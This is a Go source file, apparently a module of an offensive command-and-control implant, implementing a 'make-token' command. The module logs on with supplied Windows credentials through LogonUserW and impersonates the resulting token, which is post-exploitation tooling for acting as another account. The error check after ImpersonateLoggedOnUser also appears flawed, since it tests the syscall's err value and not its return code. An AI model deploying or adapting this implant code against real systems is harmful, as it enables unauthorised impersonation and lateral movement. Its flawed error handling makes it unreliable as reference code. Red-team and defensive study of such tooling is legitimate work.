//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	procLogonUserW = advapi32.NewProc("LogonUserW")
)

const (
	LOGON32_LOGON_INTERACTIVE     = 2
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from credentials and impersonate it"
}

type MakeTokenParams struct {
	Username string `json:"username"`
	Domain   string `json:"domain"`
	Password string `json:"password"`
}

func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var debugLog strings.Builder
	
	// Enable required privileges for token manipulation
	debugLog.WriteString("[DEBUG] Enabling token privileges...\n")
	enableTokenPrivileges()
	
	var params MakeTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.Username == "" {
		return structs.CommandResult{
			Output:    "Username is required",
			Status:    "error",
			Completed: true,
		}
	}
	if params.Domain == "" {
		params.Domain = "."
	}
	if params.Password == "" {
		return structs.CommandResult{
			Output:    "Password is required",
			Status:    "error",
			Completed: true,
		}
	}

	debugLog.WriteString(fmt.Sprintf("[DEBUG] Attempting to create token for %s\\%s\n", params.Domain, params.Username))

	// Try to get current token info
	var output string
	currentHandle, err := windows.GetCurrentProcess()
	if err == nil {
		var currentToken windows.Token
		err = windows.OpenProcessToken(currentHandle, windows.TOKEN_QUERY, &currentToken)
		if err == nil {
			defer currentToken.Close()
			currentUser, err := currentToken.GetTokenUser()
			if err == nil {
				currentUsername, currentDomain, _, err := currentUser.User.Sid.LookupAccount("")
				if err == nil {
					output = fmt.Sprintf("Old identity: %s\\%s\n", currentDomain, currentUsername)
					debugLog.WriteString(fmt.Sprintf("[DEBUG] Current identity: %s\\%s\n", currentDomain, currentUsername))
				}
			}
		}
	}

	// Convert strings to UTF-16
	usernamePtr, err := windows.UTF16PtrFromString(params.Username)
	if err != nil {
		return structs.CommandResult{
			Output:    debugLog.String() + output + fmt.Sprintf("Failed to convert username: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	domainPtr, err := windows.UTF16PtrFromString(params.Domain)
	if err != nil {
		return structs.CommandResult{
			Output:    debugLog.String() + output + fmt.Sprintf("Failed to convert domain: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	passwordPtr, err := windows.UTF16PtrFromString(params.Password)
	if err != nil {
		return structs.CommandResult{
			Output:    debugLog.String() + output + fmt.Sprintf("Failed to convert password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Call LogonUserW to create a new token (exactly like Sliver)
	debugLog.WriteString("[DEBUG] Calling LogonUserW...\n")
	var token windows.Token
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(LOGON32_LOGON_INTERACTIVE),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&token)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    debugLog.String() + output + fmt.Sprintf("LogonUserW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	debugLog.WriteString(fmt.Sprintf("[DEBUG] LogonUserW succeeded, token: 0x%x\n", token))

	// Impersonate directly using the token from LogonUser (like Sliver - NO duplication!)
	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser...\n")
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(token))
	if err != nil {
		token.Close()
		return structs.CommandResult{
			Output:    debugLog.String() + output + fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	debugLog.WriteString("[DEBUG] ImpersonateLoggedOnUser succeeded\n")

	// Keep token open - it will be closed on rev2self or process exit
	
	// Verify impersonation by checking thread token
	debugLog.WriteString("[DEBUG] Verifying impersonation...\n")
	var hThreadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &hThreadToken)
	if err == nil {
		defer hThreadToken.Close()
		debugLog.WriteString("[DEBUG] OpenThreadToken succeeded\n")
		threadTokenUser, err := hThreadToken.GetTokenUser()
		if err == nil {
			currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
			if err == nil {
				output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
				debugLog.WriteString(fmt.Sprintf("[DEBUG] Verified: %s\\%s\n", currentDomain, currentUsername))
			} else {
				output += "Successfully impersonated (verification SID lookup failed)"
				debugLog.WriteString(fmt.Sprintf("[DEBUG] SID lookup failed: %v\n", err))
			}
		} else {
			output += "Successfully impersonated (verification GetTokenUser failed)"
			debugLog.WriteString(fmt.Sprintf("[DEBUG] GetTokenUser failed: %v\n", err))
		}
	} else {
		output += fmt.Sprintf("Warning: Impersonation succeeded but verification failed: %v", err)
		debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenThreadToken failed: %v\n", err))
	}

	return structs.CommandResult{
		Output:    debugLog.String() + "\n" + strings.TrimSpace(output),
		Status:    "success",
		Completed: true,
	}
}
